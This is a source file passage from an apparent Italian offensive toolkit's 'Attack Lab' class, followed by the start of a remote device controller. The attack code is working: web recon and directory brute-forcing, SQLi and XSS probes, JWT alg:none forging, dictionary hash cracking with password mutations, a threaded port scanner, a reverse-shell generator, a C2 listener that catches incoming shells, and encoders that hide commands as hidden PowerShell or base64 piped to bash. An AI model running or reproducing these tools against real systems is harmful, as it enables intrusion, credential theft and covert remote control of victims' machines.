                sev = "CRITICA" if (acao == "https://evil.example" and acac.lower() == "true") else "da verificare"
                out.append(f"CORS: riflette Origin arbitraria (ACAO={acao}, credentials={acac or 'no'}) -> {sev}")
        except Exception:
            pass

        # path sensibili
        hits = []
        base = url.rstrip("/")
        for p in self._SENSITIVE_PATHS:
            try:
                pr = requests.get(base + p, timeout=6, allow_redirects=False,
                                  headers={"User-Agent": "FRANCO-AttackLab/1.0"})
                if pr.status_code == 200 and len(pr.content) > 0:
                    hits.append(f"{p} (200, {len(pr.content)}B)")
            except Exception:
                continue
        out.append("Path sensibili esposti: " + (", ".join(hits) if hits else "nessuno"))
        if self.event_bus:
            try:
                self.event_bus.emit("attack.recon", url=url, grade=grade, exposed=len(hits))
            except Exception:
                pass
        return "\n".join(out)

    # ---------- payload lab ----------
    def encode_payloads(self, text: str) -> str:
        if not text:
            return "Dammi il payload: 'codifica payload <script>alert(1)</script>'."
        b = text.encode("utf-8", "replace")
        enc = {
            "base64": base64.b64encode(b).decode(),
            "base64x2": base64.b64encode(base64.b64encode(b)).decode(),
            "url": urllib.parse.quote(text, safe=""),
            "url doppio": urllib.parse.quote(urllib.parse.quote(text, safe=""), safe=""),
            "hex": b.hex(),
            "hex \\x": "".join(f"\\x{c:02x}" for c in b),
            "unicode \\u": "".join(f"\\u{ord(c):04x}" for c in text),
            "html entities": "".join(f"&#{ord(c)};" for c in text),
            "case-flip": text.swapcase(),
        }
        lines = ["PAYLOAD LAB — mutazioni per test bypass filtri/WAF:"]
        for name, val in enc.items():
            lines.append(f"  [{name}] {val[:200]}")
        # mutazioni SQL/JS comuni per il testo grezzo
        lines.append("  [sql-comment] " + re.sub(r"\s+", "/**/", text)[:200])
        return "\n".join(lines)

    # ---------- JWT lab ----------
    @staticmethod
    def _b64url_decode(seg: str) -> bytes:
        seg += "=" * (-len(seg) % 4)
        return base64.urlsafe_b64decode(seg.encode())

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode().rstrip("=")

    def jwt_decode(self, token: str) -> str:
        token = token.strip()
        parts = token.split(".")
        if len(parts) < 2:
            return "Non è un JWT valido (servono header.payload.firma)."
        try:
            header = json.loads(self._b64url_decode(parts[0]))
            payload = json.loads(self._b64url_decode(parts[1]))
        except Exception as e:
            return f"JWT non decodificabile: {e}"
        alg = str(header.get("alg", "?"))
        warn = ""
        if alg.lower() == "none":
            warn = "  [!] alg:none — nessuna firma, accettazione = auth bypass"
        elif alg.upper().startswith("HS"):
            warn = "  [!] HMAC — testabile con wordlist (crackabile se segreto debole)"
        return ("JWT DECODE:\n"
                f"  header:  {json.dumps(header)}\n"
                f"  payload: {json.dumps(payload)}\n"
                f"  alg: {alg}\n{warn}").rstrip()

    def jwt_forge_none(self, token: str) -> str:
        token = token.strip()
        parts = token.split(".")
        if len(parts) < 2:
            return "Passami un JWT valido da riscrivere: 'forgia jwt <token>'."
        try:
            payload = json.loads(self._b64url_decode(parts[1]))
        except Exception as e:
            return f"Payload non leggibile: {e}"
        header = {"alg": "none", "typ": "JWT"}
        h = self._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        forged = f"{h}.{p}."
        return ("JWT FORGE (alg:none, firma vuota) — testa su endpoint che accettano 'none':\n"
                f"  {forged}")

    # ---------- CVE intel ----------
    def cve_lookup(self, keyword: str) -> str:
        keyword = keyword.strip()
        if not keyword:
            return "Cosa cerco? 'cerca cve apache 2.4.49'."
        if requests is None:
            return "Modulo requests non disponibile per la ricerca CVE."
        try:
            r = requests.get(
                "https://services.nvd.nist.gov/rest/json/cves/2.0",
                params={"keywordSearch": keyword, "resultsPerPage": 5},
                timeout=15, headers={"User-Agent": "FRANCO-AttackLab/1.0"},
            )
            r.raise_for_status()
            data = r.json()
        except Exception as e:
            return f"Ricerca CVE fallita: {e}"
        items = data.get("vulnerabilities", [])
        if not items:
            return f"Nessuna CVE trovata per '{keyword}'."
        lines = [f"CVE INTEL — '{keyword}' ({data.get('totalResults', 0)} totali, prime {len(items)}):"]
        for it in items:
            cve = it.get("cve", {})
            cid = cve.get("id", "?")
            metrics = cve.get("metrics", {})
            score = "?"
            for mk in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                if metrics.get(mk):
                    score = metrics[mk][0]["cvssData"].get("baseScore", "?")
                    break
            desc = ""
            for d in cve.get("descriptions", []):
                if d.get("lang") == "en":
                    desc = d.get("value", "")[:140]
                    break
            lines.append(f"  {cid} [CVSS {score}] {desc}")
        return "\n".join(lines)

    # ---------- recon async di massa + auto-CVE ----------
    def _connect(self, host: str, port: int, timeout: float = 0.6):
        """Prova la connessione TCP e fa banner grab. Ritorna (port, banner) o None."""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            if s.connect_ex((host, port)) != 0:
                return None
            banner = ""
            try:
                # per servizi HTTP mandiamo una HEAD per farli parlare
                if port in (80, 8080, 443, 8443):
                    s.sendall(b"HEAD / HTTP/1.0\r\nHost: %b\r\n\r\n" % host.encode())
                s.settimeout(0.8)
                banner = s.recv(256).decode("latin-1", "replace").strip().replace("\r", " ").replace("\n", " ")
            except Exception:
                pass
            return (port, banner[:160])
        except Exception:
            return None
        finally:
            try:
                s.close()
            except Exception:
                pass

    def port_scan_fast(self, host: str, ports, workers: int = 100) -> list:
        """Scan TCP concorrente (threaded). Ritorna [(port, banner), ...] ordinato."""
        from concurrent.futures import ThreadPoolExecutor
        results = []
        with ThreadPoolExecutor(max_workers=workers) as ex:
            for r in ex.map(lambda p: self._connect(host, p), ports):
                if r:
                    results.append(r)
        return sorted(results, key=lambda x: x[0])

    def full_recon(self, target: str) -> str:
        """Recon completo: risolve host, scan porte top, banner grab, e
        auto-CVE sui servizi con versione rilevata."""
        target = target.strip()
        if not target:
            return "Dammi un host: 'recon completo scanme.nmap.org'."
        # separa eventuale range porte "host:1-1000"
        custom_ports = None
        if " " in target:
            target = target.split()[0]
        host = target
        try:
            ip = socket.gethostbyname(host)
        except Exception as e:
            return f"Host non risolvibile: {e}"

        ports = custom_ports or list(self._TOP_PORTS.keys())
        open_ports = self.port_scan_fast(host, ports)
        out = [f"RECON COMPLETO — {host} ({ip})", f"Porte aperte: {len(open_ports)}/{len(ports)}"]
        if not open_ports:
            return "\n".join(out + ["  nessuna porta top aperta (prova un range custom o -sU per UDP)."])

        cve_targets = []
        for port, banner in open_ports:
            svc = self._TOP_PORTS.get(port, "?")
            line = f"  {port:>5}/tcp  {svc:<12}"
            if banner:
                line += f"  {banner}"
            out.append(line)
            # estrai un token 'prodotto versione' dal banner per l'auto-CVE
            m = re.search(r"([A-Za-z][A-Za-z0-9_\-]{2,})[/ ]v?(\d+\.\d+[\.\d]*)", banner)
            if m:
                cve_targets.append(f"{m.group(1)} {m.group(2)}")

        if cve_targets and requests is not None:
            out.append("")
            out.append("AUTO-CVE sui servizi con versione:")
            seen = set()
            for tgt in cve_targets:
                if tgt in seen:
                    continue
                seen.add(tgt)
                res = self.cve_lookup(tgt)
                # prima riga riassuntiva + prima CVE
                first = res.split("\n")
                out.append(f"  [{tgt}] " + (first[1].strip() if len(first) > 1 else first[0]))
        elif cve_targets:
            out.append("(requests non disponibile: salto l'auto-CVE)")

        for port, banner in open_ports:
            self._record("open-port", f"{host}:{port}", "Info",
                         f"{self._TOP_PORTS.get(port, '?')} {banner}".strip())
        if self.event_bus:
            try:
                self.event_bus.emit("attack.recon_full", host=host, open=len(open_ports))
            except Exception:
                pass
        return "\n".join(out)

    # ---------- CRED LAB: identificazione + cracking a dizionario + mutazioni ----------
    @staticmethod
    def identify_hash(h: str):
        """Ritorna la lista di algoritmi candidati per un hash (per lunghezza/formato)."""
        h = h.strip()
        low = h.lower()
        if h.startswith("$2a$") or h.startswith("$2b$") or h.startswith("$2y$"):
            return ["bcrypt (non crackabile con hashlib — usa john/hashcat)"]
        if h.startswith("$6$"):
            return ["sha512crypt ($6$)"]
        if h.startswith("$1$"):
            return ["md5crypt ($1$)"]
        if h.startswith("$argon2"):
            return ["argon2"]
        if not re.fullmatch(r"[0-9a-fA-F]+", h):
            return ["formato non esadecimale — potrebbe essere base64 o cifrato"]
        by_len = {
            32: ["md5", "ntlm"], 40: ["sha1"], 56: ["sha224"],
            64: ["sha256"], 96: ["sha384"], 128: ["sha512"],
        }
        return by_len.get(len(low), [f"lunghezza {len(low)} — algoritmo ignoto"])

    def _hash_variants(self, word: str) -> dict:
        """Calcola gli hash di una parola per tutti gli algoritmi supportati."""
        wb = word.encode("utf-8", "replace")
        out = {
            "md5": hashlib.md5(wb).hexdigest(),
            "sha1": hashlib.sha1(wb).hexdigest(),
            "sha224": hashlib.sha224(wb).hexdigest(),
            "sha256": hashlib.sha256(wb).hexdigest(),
            "sha384": hashlib.sha384(wb).hexdigest(),
            "sha512": hashlib.sha512(wb).hexdigest(),
        }
        try:
            out["ntlm"] = hashlib.new("md4", word.encode("utf-16-le")).hexdigest()
        except Exception:
            pass
        return out

    @staticmethod
    def _mutate(word: str):
        """Genera mutazioni realistiche di una parola base (leet, case, suffissi)."""
        leet = word.translate(str.maketrans("aeiosAEIOS", "4310541054"))
        bases = {word, word.capitalize(), word.upper(), word.lower(), leet,
                 leet.capitalize()}
        suffixes = ("", "1", "12", "123", "1234", "!", "!!", "@", "#", ".",
                    "2024", "2025", "2026", "01", "007")
        out = []
        seen = set()
        for b in bases:
            for s in suffixes:
                c = b + s
                if c not in seen:
                    seen.add(c)
                    out.append(c)
        return out

    def _candidate_words(self, extra_wordlist=None):
        """Genera lo stream di candidati: wordlist file (se dato) + integrata + mutazioni."""
        if extra_wordlist:
            try:
                with open(extra_wordlist, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        w = line.strip()
                        if w:
                            yield w
                return
            except Exception:
                pass
        seen = set()
        for base in self._COMMON_WORDS:
            for c in self._mutate(base):
                if c not in seen:
                    seen.add(c)
                    yield c

    def crack_hash(self, arg: str) -> str:
        """Cracking a dizionario: 'cracka hash <hash> [con <path-wordlist>]'."""
        arg = arg.strip()
        if not arg:
            return "Dammi un hash: 'cracka hash 5f4dcc3b5aa765d61d8327deb882cf99'."
        wordlist = None
        m = re.search(r"\s+con\s+(.+)$", arg)
        if m:
            wordlist = m.group(1).strip()
            arg = arg[:m.start()].strip()
        target = arg.split()[0].strip().lower()

        algos = self.identify_hash(target)
        crackable = [a for a in algos if a in ("md5", "ntlm", "sha1", "sha224",
                                               "sha256", "sha384", "sha512")]
        out = [f"CRED LAB — hash: {target[:80]}", f"Candidati: {', '.join(algos)}"]
        if not crackable:
            out.append("Nessun algoritmo hashlib crackabile qui. Esporta per john/hashcat.")
            return "\n".join(out)

        tried = 0
        for word in self._candidate_words(wordlist):
            tried += 1
            variants = self._hash_variants(word)
            for algo in crackable:
                if variants.get(algo) == target:
                    out.append(f"[+] CRACCATO ({algo}): '{word}'  (dopo {tried} tentativi)")
                    self._record("hash-cracked", f"{algo}:{target[:24]}…", "High", f"plaintext = '{word}'")
                    return "\n".join(out)
            if tried >= 200000:  # cap di sicurezza
                break
        out.append(f"[-] Non craccato in {tried} candidati. Prova una wordlist con 'con <path>'.")
        return "\n".join(out)

    def password_mutations(self, word: str) -> str:
        """Genera una wordlist mirata da una parola base (OSINT su target)."""
        word = word.strip()
        if not word:
            return "Dammi una parola base: 'mutazioni password Marco'."
        muts = self._mutate(word)
        head = muts[:60]
        return (f"WORDLIST MIRATA da '{word}' — {len(muts)} candidati (primi {len(head)}):\n"
                + "  " + ", ".join(head)
                + (f"\n  ... (+{len(muts) - len(head)} altri)" if len(muts) > len(head) else ""))

    # ---------- WEB-ATTACK: dirbust + SQLi/XSS reflected + form crawler ----------
    @staticmethod
    def _norm_url(url: str) -> str:
        url = url.strip().split()[0] if url.strip() else ""
        if url and not url.startswith(("http://", "https://")):
            url = "https://" + url
        return url

    def _session(self):
        s = requests.Session()
        s.headers.update({"User-Agent": "FRANCO-AttackLab/1.0"})
        return s

    def dirbust(self, url: str) -> str:
        url = self._norm_url(url)
        if not url:
            return "Dammi un URL: 'dirbust https://esempio.com'."
        if requests is None:
            return "Modulo requests non disponibile."
        s = self._session()
        base = url.rstrip("/")
        found = []
        for p in self._DIRBUST_PATHS:
            try:
                r = s.get(f"{base}/{p}", timeout=6, allow_redirects=False)
                if r.status_code in (200, 204, 301, 302, 307, 401, 403):
                    tag = {401: "AUTH", 403: "FORBIDDEN"}.get(r.status_code, "")
                    found.append(f"  /{p:<24} [{r.status_code}] {len(r.content)}B {tag}")
                    sev = "High" if any(x in p for x in (".env", ".git", "backup", "config", "phpinfo")) \
                        and r.status_code == 200 else "Low"
                    self._record("dirbust", f"{base}/{p}", sev, f"HTTP {r.status_code}, {len(r.content)}B {tag}")
            except Exception:
                continue
        head = [f"DIRBUST — {base} ({len(self._DIRBUST_PATHS)} path)"]
        return "\n".join(head + (found or ["  nessun path interessante trovato."]))

    def probe_sqli(self, url: str) -> str:
        url = self._norm_url(url)
        if not url:
            return "URL con parametri: 'test sqli https://sito/p?id=1'."
        if requests is None:
            return "Modulo requests non disponibile."
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return "Nessun parametro in query da testare. Usa un URL tipo ...?id=1."
        s = self._session()
        out = [f"SQLi REFLECTED (non distruttivo) — {url}"]
        flagged = False
        for pname in params:
            for payload in ("'", "''", "1' AND '1'='1", "1' AND '1'='2"):
                q = dict(params)
                q[pname] = payload
                test = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
                try:
                    r = s.get(test, timeout=8)
                except Exception:
                    continue
                low = r.text.lower()
                hit = next((e for e in self._SQL_ERRORS if e in low), None)
                if hit:
                    out.append(f"  [+] param '{pname}' con {payload!r} -> errore SQL: \"{hit}\"")
                    self._record("sqli", f"{url} [{pname}]", "High", f"errore SQL riflesso: {hit}")
                    flagged = True
                    break
        if not flagged:
            out.append("  [-] nessun errore SQL riflesso (prova probe boolean/time-based manuali).")
        return "\n".join(out)

    def probe_xss(self, url: str) -> str:
        url = self._norm_url(url)
        if not url:
            return "URL con parametri: 'test xss https://sito/p?q=ciao'."
        if requests is None:
            return "Modulo requests non disponibile."
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return "Nessun parametro in query da testare. Usa un URL tipo ...?q=ciao."
        s = self._session()
        marker = "fr4nco" + secrets.token_hex(3)
        probe = f"{marker}'\"><x{marker}>"
        out = [f"XSS REFLECTED — {url}", f"  marker: {probe}"]
        flagged = False
        for pname in params:
            q = dict(params)
            q[pname] = probe
            test = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
            try:
                r = s.get(test, timeout=8)
            except Exception:
                continue
            if f"<x{marker}>" in r.text:
                out.append(f"  [+] param '{pname}': marker riflesso NON codificato -> XSS probabile")
                self._record("xss", f"{url} [{pname}]", "High", "marker riflesso non codificato (XSS reflected)")
                flagged = True
            elif marker in r.text:
                out.append(f"  [~] param '{pname}': marker riflesso ma codificato (contesto da verificare)")
        if not flagged:
            out.append("  [-] nessuna riflessione grezza rilevata.")
        return "\n".join(out)

    def crawl_forms(self, url: str) -> str:
        url = self._norm_url(url)
        if not url:
            return "Dammi un URL: 'crawl form https://sito/login'."
        if requests is None:
            return "Modulo requests non disponibile."
        try:
            html = self._session().get(url, timeout=8).text
        except Exception as e:
            return f"Pagina non raggiungibile: {e}"
        forms = re.findall(r"<form\b[^>]*>(.*?)</form>", html, re.I | re.S)
        heads = re.findall(r"<form\b([^>]*)>", html, re.I)
        if not forms:
            return "Nessun <form> trovato nella pagina."
        out = [f"FORM CRAWLER — {url} ({len(forms)} form)"]
        for i, (attrs, body) in enumerate(zip(heads, forms), 1):
            action = (re.search(r'action=["\']([^"\']*)', attrs, re.I) or [None, "(self)"])[1]
            method = (re.search(r'method=["\']([^"\']*)', attrs, re.I) or [None, "GET"])[1].upper()
            fields = re.findall(r'<(?:input|textarea|select)\b[^>]*name=["\']([^"\']+)["\'][^>]*>', body, re.I)
            types = re.findall(r'<input\b[^>]*type=["\']([^"\']+)["\']', body, re.I)
            out.append(f"  form#{i}: {method} {action}")
            out.append(f"    campi: {', '.join(fields) if fields else '(nessuno)'}")
            if "password" in types:
                out.append("    [!] form di autenticazione (campo password)")
        return "\n".join(out)

    def web_attack(self, url: str) -> str:
        url = self._norm_url(url)
        if not url:
            return "Dammi un URL: 'web attack https://esempio.com'."
        blocks = ["===== WEB ATTACK =====", self.dirbust(url), self.crawl_forms(url)]
        if urllib.parse.urlparse(url).query:
            blocks.append(self.probe_sqli(url))
            blocks.append(self.probe_xss(url))
        else:
            blocks.append("SQLi/XSS: salto (URL senza parametri in query). "
                          "Rilancia con ...?param=valore per testare.")
        return "\n\n".join(blocks)

    # ---------- C2 / PAYLOAD FORGE: revshell + listener socket + encoder ----------
    def revshell(self, arg: str) -> str:
        """Genera reverse-shell one-liner. 'forgia shell <lhost> <lport> [flavor]'."""
        toks = arg.split()
        if len(toks) < 2:
            return ("Uso: 'forgia shell <lhost> <lport> [flavor]'. "
                    "Flavor: " + ", ".join(self._RSHELLS.keys()) + ", o 'tutti'.")
        lhost, lport = toks[0], toks[1]
        flavor = toks[2].lower() if len(toks) > 2 else "tutti"
        if flavor in ("tutti", "all", "*"):
            out = [f"REVERSE SHELL — LHOST={lhost} LPORT={lport}",
                   f"Listener: avvia con 'avvia listener {lport}' (o nc -lvnp {lport})"]
            for name, tpl in self._RSHELLS.items():
                out.append(f"\n[{name}]\n{tpl.format(ip=lhost, port=lport)}")
            return "\n".join(out)
        tpl = self._RSHELLS.get(flavor)
        if not tpl:
            return f"Flavor '{flavor}' sconosciuto. Disponibili: {', '.join(self._RSHELLS.keys())}."
        return (f"REVERSE SHELL [{flavor}] — LHOST={lhost} LPORT={lport}\n"
                f"{tpl.format(ip=lhost, port=lport)}\n"
                f"Listener: 'avvia listener {lport}'")

    def start_listener(self, arg: str) -> str:
        """Avvia un listener TCP che cattura la reverse shell in ingresso."""
        arg = (arg or "").strip()
        m = re.search(r"\d{2,5}", arg)
        if not m:
            return "Uso: 'avvia listener <porta>' (es. 'avvia listener 4444')."
        port = int(m.group(0))
        listeners = getattr(self, "_listeners", None)
        if listeners is None:
            listeners = {}
            self._listeners = listeners
        if port in listeners and listeners[port].get("alive"):
            return f"Listener già attivo su :{port}."
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", port))
            srv.listen(1)
            srv.settimeout(1.0)
        except Exception as e:
            return f"Impossibile aprire il listener su :{port} ({e})."
        state = {"sock": srv, "alive": True, "peer": None, "log": []}
        listeners[port] = state

        def loop():
            import time as _t
            while state["alive"]:
                try:
                    conn, addr = srv.accept()
                except socket.timeout:
                    continue
                except Exception:
                    break
                state["peer"] = f"{addr[0]}:{addr[1]}"
                try:
                    self.logger.success("C2", f"Reverse shell da {state['peer']} su :{port}")
                except Exception:
                    pass
                if self.event_bus:
                    try:
                        self.event_bus.emit("c2.connect", port=port, peer=state["peer"])
                    except Exception:
                        pass
                conn.settimeout(1.0)
                while state["alive"]:
                    try:
                        data = conn.recv(4096)
                    except socket.timeout:
                        continue
                    except Exception:
                        break
                    if not data:
                        break
                    state["log"].append(data.decode("latin-1", "replace"))
                    if len(state["log"]) > 500:
                        state["log"] = state["log"][-500:]
                try:
                    conn.close()
                except Exception:
                    pass
            try:
                srv.close()
            except Exception:
                pass

        threading.Thread(target=loop, daemon=True, name=f"C2-listen-{port}").start()
        return f"Listener TCP attivo su 0.0.0.0:{port}. In attesa della connessione. Stato: 'stato listener'."

    def listener_status(self) -> str:
        listeners = getattr(self, "_listeners", {}) or {}
        if not listeners:
            return "Nessun listener attivo. Avvialo con 'avvia listener <porta>'."
        out = ["LISTENER C2:"]
        for port, st in listeners.items():
            alive = "attivo" if st.get("alive") else "fermo"
            peer = st.get("peer") or "nessuna connessione"
            recv = "".join(st.get("log", []))[-400:]
            out.append(f"  :{port} [{alive}] peer={peer}")
            if recv.strip():
                out.append(f"    output recente:\n    " + recv.strip().replace("\n", "\n    "))
        return "\n".join(out)

    def encode_oneliner(self, cmd: str) -> str:
        """Encoder polimorfici per offuscare un comando/one-liner."""
        cmd = cmd.strip()
        if not cmd:
            return "Dammi un comando: 'encoda comando whoami'."
        b = cmd.encode("utf-8", "replace")
        b64 = base64.b64encode(b).decode()
        ps_enc = base64.b64encode(cmd.encode("utf-16-le")).decode()
        py_inner = f"import os;os.system({cmd!r})"
        py_b64 = base64.b64encode(py_inner.encode()).decode()
        return (
            f"ENCODER POLIMORFICI — '{cmd[:60]}'\n"
            f"[powershell -enc]  powershell -nop -w hidden -enc {ps_enc}\n"
            f"[bash base64]      echo {b64} | base64 -d | bash\n"
            f"[sh base64]        echo {b64}|base64 -d|sh\n"
            f"[url]              {urllib.parse.quote(cmd, safe='')}\n"
            f"[hex]              {b.hex()}\n"
            f"[python exec]      python3 -c \"import base64;exec(base64.b64decode('{py_b64}'))\""
        )

    # ---------- REPORT OFFENSIVO: tracker finding + export HTML ----------
    def _record(self, ftype: str, target: str, severity: str, detail: str) -> None:
        """Registra un finding in memoria per il report finale."""
        fl = getattr(self, "_findings", None)
        if fl is None:
            fl = []
            self._findings = fl
        fl.append({
            "type": ftype, "target": str(target)[:120], "severity": severity,
            "detail": str(detail)[:500],
            "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        })
        if len(fl) > 2000:
            del fl[:len(fl) - 2000]

    def report_html(self) -> str:
        """Genera un report HTML autoconsistente dei finding e lo salva su disco."""
        import html as _html
        fl = getattr(self, "_findings", []) or []
        if not fl:
            return "Nessun finding registrato in questa sessione. Lancia recon/web attack/crack prima."
        order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
        fl_sorted = sorted(fl, key=lambda f: order.get(f["severity"], 5))
        counts = {}
        for f in fl:
            counts[f["severity"]] = counts.get(f["severity"], 0) + 1
        gen = datetime.now().strftime("%Y-%m-%d %H:%M")
        summary = " · ".join(f"{counts.get(k, 0)} {k}" for k in ("Critical", "High", "Medium", "Low", "Info"))
        rows = []
        for f in fl_sorted:
            cls = f["severity"].lower()
            rows.append(
                f'<tr class="r-{cls}"><td><span class="pill p-{cls}">{f["severity"]}</span></td>'
                f'<td class="mono">{_html.escape(f["type"])}</td>'
                f'<td class="mono">{_html.escape(f["target"])}</td>'
                f'<td>{_html.escape(f["detail"])}</td>'
                f'<td class="mono ts">{f["ts"]}</td></tr>'
            )
        doc = """<!doctype html><html lang="it"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FRANCO Attack Report</title>
<style>
:root{--bg:#f5f6f9;--surf:#fff;--ink:#141922;--muted:#5b6472;--bd:#e2e6ee;--acc:#b3312f;
--crit:#c22f48;--critb:#fbe9ec;--high:#c65a1f;--highb:#fbeadd;--med:#b3861a;--medb:#f8f0d6;
--low:#2f77ad;--lowb:#e4eff8;--info:#626d7e;--infob:#eceef2;}
@media(prefers-color-scheme:dark){:root{--bg:#0e1218;--surf:#161c26;--ink:#e7ebf3;--muted:#93a0b3;--bd:#263041;--acc:#f16d6b;
--crit:#f16d84;--critb:#2d1820;--high:#ef9a63;--highb:#2c1d13;--med:#e4c05a;--medb:#2a2412;
--low:#6cb2e6;--lowb:#12222f;--info:#9aa5b6;--infob:#1c232f;}}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);
font-family:"Segoe UI",system-ui,sans-serif;line-height:1.55}
.wrap{max-width:60rem;margin:0 auto;padding:2.5rem 1.25rem 4rem}
.ey{font-family:ui-monospace,Consolas,monospace;font-size:.7rem;letter-spacing:.18em;
text-transform:uppercase;color:var(--acc);font-weight:700;margin:0 0 .6rem}
h1{font-size:2rem;margin:0 0 .3rem;letter-spacing:-.01em}
.sub{color:var(--muted);margin:0 0 1.5rem}
.sum{display:inline-block;font-family:ui-monospace,monospace;background:var(--surf);
border:1px solid var(--bd);border-radius:10px;padding:.6rem 1rem;font-size:.9rem;margin-bottom:1.5rem}
.scroll{overflow-x:auto;border:1px solid var(--bd);border-radius:12px;background:var(--surf)}
table{border-collapse:collapse;width:100%;min-width:44rem}
th{text-align:left;font-family:ui-monospace,monospace;font-size:.66rem;letter-spacing:.1em;
text-transform:uppercase;color:var(--muted);padding:.75rem 1rem;border-bottom:1px solid var(--bd)}
td{padding:.7rem 1rem;border-bottom:1px solid var(--bd);font-size:.9rem;vertical-align:top}
tr:last-child td{border-bottom:none}
.mono{font-family:ui-monospace,Consolas,monospace;font-size:.82rem}
.ts{color:var(--muted);white-space:nowrap}
.pill{display:inline-block;font-family:ui-monospace,monospace;font-size:.7rem;font-weight:700;
padding:.2rem .55rem;border-radius:999px;white-space:nowrap}
.p-critical{color:var(--crit);background:var(--critb)}.p-high{color:var(--high);background:var(--highb)}
.p-medium{color:var(--med);background:var(--medb)}.p-low{color:var(--low);background:var(--lowb)}
.p-info{color:var(--info);background:var(--infob)}
footer{margin-top:2rem;color:var(--muted);font-size:.8rem}
</style></head><body><div class="wrap">
<p class="ey">FRANCO Attack Lab · report offensivo</p>
<h1>Report di sessione offensiva</h1>
<p class="sub">Finding raccolti automaticamente da recon, web-attack, cred lab, CVE intel e C2.</p>
<div class="sum">__SUMMARY__ &nbsp;·&nbsp; generato __GEN__</div>
<div class="scroll"><table><thead><tr><th>Severità</th><th>Tipo</th><th>Target</th><th>Dettaglio</th><th>Timestamp</th></tr></thead>
<tbody>__ROWS__</tbody></table></div>
<footer>FRANCO 6.0 NEXUS · Attack Lab · uso autorizzato red-team. __COUNT__ finding totali.</footer>
</div></body></html>"""
        doc = (doc.replace("__SUMMARY__", summary).replace("__GEN__", gen)
               .replace("__ROWS__", "".join(rows)).replace("__COUNT__", str(len(fl))))
        # salva su disco: franco_data se disponibile, altrimenti Desktop, altrimenti cwd
        fname = f"franco_attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        candidates = []
        try:
            candidates.append(DATA_DIR / "reports")
        except Exception:
            pass
        candidates.append(Path.home() / "Desktop")
        candidates.append(Path.cwd())
        for base in candidates:
            try:
                base.mkdir(parents=True, exist_ok=True)
                path = base / fname
                path.write_text(doc, encoding="utf-8")
                if self.event_bus:
                    try:
                        self.event_bus.emit("attack.report", path=str(path), findings=len(fl))
                    except Exception:
                        pass
                return f"Report offensivo salvato: {path}\n  {summary}\n  {len(fl)} finding totali."
            except Exception:
                continue
        return "Impossibile salvare il report su disco."


# ==============================================================================
# REMOTE DEVICE CONTROLLER — controllo remoto di TUTTI i dispositivi via voce
# ==============================================================================

# Catalogo dei comandi vocali per il controllo dispositivi. Usato sia per il
# routing sia per la scheda "comandi vocali" messa in evidenza a schermo.
VOICE_DEVICE_COMMANDS: Dict[str, List[str]] = {
    "Smart home (Home Assistant)": [
        "accendi le luci [del salotto]",
        "spegni tutte le luci",
        "commuta la luce cucina",
        "imposta la temperatura a 21 gradi",
        "attiva la scena cinema",
        "stato della casa",
    ],
    "Telefono / tablet (Android via ADB)": [
        "blocca il telefono [di Marco]",
        "sveglia il tablet",
        "fai squillare il telefono   (trova il dispositivo)",
        "riavvia il telefono",
        "fai uno screenshot del telefono",
    ],
    "Telefono (iOS via Scorciatoie)": [
        "blocca l'iphone",
        "fai squillare l'iphone",
        "esegui la scorciatoia <nome> sull'iphone",
    ],
    "Broadcast (tutti insieme)": [
        "blocca tutti i dispositivi",
        "fai squillare tutti i dispositivi",
        "spegni tutto",
    ],
    "Gestione": [
        "lista dispositivi",
        "aggiungi dispositivo <nome> android <ip:porta>",
        "autorizza dispositivo <nome>",
        "comandi dispositivi   (mostra questa lista)",
    ],
}


def render_voice_command_catalog(color: bool = False) -> str:
    """Costruisce la scheda testuale dei comandi vocali dispositivi, evidenziata."""
    C1 = "\033[1;96m" if color else ""
    C2 = "\033[0;96m" if color else ""
    CD = "\033[2;37m" if color else ""
    R  = "\033[0m"    if color else ""
    lines = [f"{C1}🎙  COMANDI VOCALI — CONTROLLO DISPOSITIVI{R}"]
    for group, cmds in VOICE_DEVICE_COMMANDS.items():
        lines.append(f"{C2}┏━ {group}{R}")
        for c in cmds:
            lines.append(f"{CD}┃{R}  » {c}")
    return "\n".join(lines)


def highlight_voice_command(text: str, width: int = 58) -> str:
    """Riquadro ANSI che mette in EVIDENZA un comando vocale riconosciuto."""
    C = "\033[1;96m"; R = "\033[0m"
    label = "[ 🎙  COMANDO VOCALE ]"
    body = text if len(text) <= width - 6 else text[: width - 9] + "..."
    top = "╔" + label + "═" * max(0, width - len(label)) + "╗"
    mid = "║  » " + body.ljust(width - 5) + "║"
    bot = "╚" + "═" * width + "╝"
    return f"{C}{top}\n{mid}\n{bot}{R}"


class RemoteDeviceController:
    """
    Facade unica per comandare da remoto TUTTI i dispositivi di FRANCO tramite
    comando vocale:

      • Smart-home Home Assistant  → luci, prese, clima, scene, script
      • Telefoni/tablet Android    → ADB over TCP (blocca, sveglia, riavvia,
                                     squilla/trova, screenshot, volume)
      • Telefoni iOS               → push ntfy che innesca una Scorciatoia
      • Broadcast "tutti"          → applica l'azione a ogni dispositivo

    Ogni chiamata esterna è protetta: se ADB/HA/requests non sono disponibili
    il controller degrada con un messaggio parlato, senza mai sollevare.
    """

    # verbo → azione canonica (le frasi più lunghe vincono nel matching)
    _ACTIONS = {
        "shortcut":   ("esegui scorciatoia", "avvia scorciatoia"),
        "vol_up":     ("alza il volume", "aumenta il volume", "volume su"),
        "vol_down":   ("abbassa il volume", "diminuisci il volume", "volume giù", "volume giu"),
